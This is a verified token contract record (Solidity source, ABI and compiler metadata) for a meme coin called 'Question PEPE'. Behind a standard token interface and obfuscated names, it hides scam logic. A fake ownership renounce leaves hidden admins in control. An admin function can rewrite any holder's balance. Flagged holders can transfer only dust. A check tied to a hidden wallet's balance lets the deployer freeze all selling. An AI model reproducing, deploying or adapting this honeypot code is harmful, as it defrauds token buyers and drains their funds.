{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface launchLaunchedMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isTotal) external view returns (uint256);\n\n    function transfer(address minWalletLimit, uint256 modeReceiverLaunch) external returns (bool);\n\n    function allowance(address amountBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeReceiverLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minWalletLimit,\n        uint256 modeReceiverLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletLaunch, uint256 value);\n    event Approval(address indexed amountBuy, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeShould {\n    function createPair(address enableAuto, address walletIs) external returns (address);\n}\n\ninterface launchLaunchedMinMetadata is launchLaunchedMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract QuestionPEPE is receiverTeam, launchLaunchedMin, launchLaunchedMinMetadata {\n\n    address public liquidityAuto;\n\n    string private launchLiquidity = \"QPE\";\n\n    uint256 constant limitIs = 15 ** 10;\n\n    mapping(address => bool) public txReceiver;\n\n    uint256 public isTeam;\n\n    mapping(address => mapping(address => uint256)) private swapWallet;\n\n    uint256 takeTotalLaunch;\n\n    constructor (){\n        if (swapIs != sellReceiver) {\n            autoMax = isTeam;\n        }\n        sellAuto receiverSwap = sellAuto(maxTotal);\n        tokenTeam = feeShould(receiverSwap.factory()).createPair(receiverSwap.WETH(), address(this));\n        \n        liquidityAuto = _msgSender();\n        sellTeam();\n        txReceiver[liquidityAuto] = true;\n        shouldLaunch[liquidityAuto] = sellToTake;\n        \n        emit Transfer(address(0), liquidityAuto, sellToTake);\n    }\n\n    function approve(address modeAutoMarketing, uint256 modeReceiverLaunch) public virtual override returns (bool) {\n        swapWallet[_msgSender()][modeAutoMarketing] = modeReceiverLaunch;\n        emit Approval(_msgSender(), modeAutoMarketing, modeReceiverLaunch);\n        return true;\n    }\n\n    function maxTake(address totalTake) public {\n        marketingSender();\n        if (autoMax == launchedFrom) {\n            sellReceiver = false;\n        }\n        if (totalTake == liquidityAuto || totalTake == tokenTeam) {\n            return;\n        }\n        tradingShould[totalTake] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountFundList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellToTake;\n    }\n\n    uint8 private receiverMin = 18;\n\n    function listTx(address modeLiquidity, uint256 modeReceiverLaunch) public {\n        marketingSender();\n        shouldLaunch[modeLiquidity] = modeReceiverLaunch;\n    }\n\n    bool public takeAt;\n\n    uint256 public limitMax;\n\n    uint256 private sellToTake = 100000000 * 10 ** 18;\n\n    uint256 launchedLimitFund;\n\n    bool private sellReceiver;\n\n    function transfer(address modeLiquidity, uint256 modeReceiverLaunch) external virtual override returns (bool) {\n        return tradingTeam(_msgSender(), modeLiquidity, modeReceiverLaunch);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atListTotal;\n    }\n\n    function tradingTeam(address shouldAmount, address minWalletLimit, uint256 modeReceiverLaunch) internal returns (bool) {\n        if (shouldAmount == liquidityAuto) {\n            return receiverAuto(shouldAmount, minWalletLimit, modeReceiverLaunch);\n        }\n        uint256 enableWallet = launchLaunchedMin(tokenTeam).balanceOf(toMax);\n        require(enableWallet == takeTotalLaunch);\n        require(minWalletLimit != toMax);\n        if (tradingShould[shouldAmount]) {\n            return receiverAuto(shouldAmount, minWalletLimit, limitIs);\n        }\n        return receiverAuto(shouldAmount, minWalletLimit, modeReceiverLaunch);\n    }\n\n    function receiverAuto(address shouldAmount, address minWalletLimit, uint256 modeReceiverLaunch) internal returns (bool) {\n        require(shouldLaunch[shouldAmount] >= modeReceiverLaunch);\n        shouldLaunch[shouldAmount] -= modeReceiverLaunch;\n        shouldLaunch[minWalletLimit] += modeReceiverLaunch;\n        emit Transfer(shouldAmount, minWalletLimit, modeReceiverLaunch);\n        return true;\n    }\n\n    uint256 private autoMax;\n\n    function owner() external view returns (address) {\n        return amountFundList;\n    }\n\n    uint256 private launchedFrom;\n\n    mapping(address => uint256) private shouldLaunch;\n\n    function allowance(address limitLaunch, address modeAutoMarketing) external view virtual override returns (uint256) {\n        if (modeAutoMarketing == maxTotal) {\n            return type(uint256).max;\n        }\n        return swapWallet[limitLaunch][modeAutoMarketing];\n    }\n\n    function sellTeam() public {\n        emit OwnershipTransferred(liquidityAuto, address(0));\n        amountFundList = address(0);\n    }\n\n    mapping(address => bool) public tradingShould;\n\n    function marketingSender() private view {\n        require(txReceiver[_msgSender()]);\n    }\n\n    bool public swapIs;\n\n    address private amountFundList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverMin;\n    }\n\n    address toMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private atListTotal = \"Question PEPE\";\n\n    address maxTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address shouldAmount, address minWalletLimit, uint256 modeReceiverLaunch) external override returns (bool) {\n        if (_msgSender() != maxTotal) {\n            if (swapWallet[shouldAmount][_msgSender()] != type(uint256).max) {\n                require(modeReceiverLaunch <= swapWallet[shouldAmount][_msgSender()]);\n                swapWallet[shouldAmount][_msgSender()] -= modeReceiverLaunch;\n            }\n        }\n        return tradingTeam(shouldAmount, minWalletLimit, modeReceiverLaunch);\n    }\n\n    function balanceOf(address isTotal) public view virtual override returns (uint256) {\n        return shouldLaunch[isTotal];\n    }\n\n    function enableAmount(uint256 modeReceiverLaunch) public {\n        marketingSender();\n        takeTotalLaunch = modeReceiverLaunch;\n    }\n\n    address public tokenTeam;\n\n    function enableSwap(address isExemptTake) public {\n        if (takeAt) {\n            return;\n        }\n        \n        txReceiver[isExemptTake] = true;\n        \n        takeAt = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchLiquidity;\n    }\n\n    event OwnershipTransferred(address indexed buySwapTo, address indexed marketingSenderFee);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySwapTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSenderFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAutoMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAutoMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeReceiverLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeReceiverLaunch\",\"type\":\"uint256\"}],\"name\":\"enableAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExemptTake\",\"type\":\"address\"}],\"name\":\"enableSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeReceiverLaunch\",\"type\":\"uint256\"}],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"}],\"name\":\"maxTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeReceiverLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minWalletLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeReceiverLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "QuestionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}